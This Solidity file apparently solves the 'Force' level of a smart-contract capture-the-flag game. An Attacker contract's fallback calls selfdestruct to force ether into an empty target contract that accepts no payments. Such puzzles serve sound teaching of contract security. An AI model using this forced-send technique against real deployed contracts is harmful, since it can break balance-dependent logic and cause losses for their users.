// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Attacker {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    fallback() external payable {
        selfdestruct(target);
    }
}
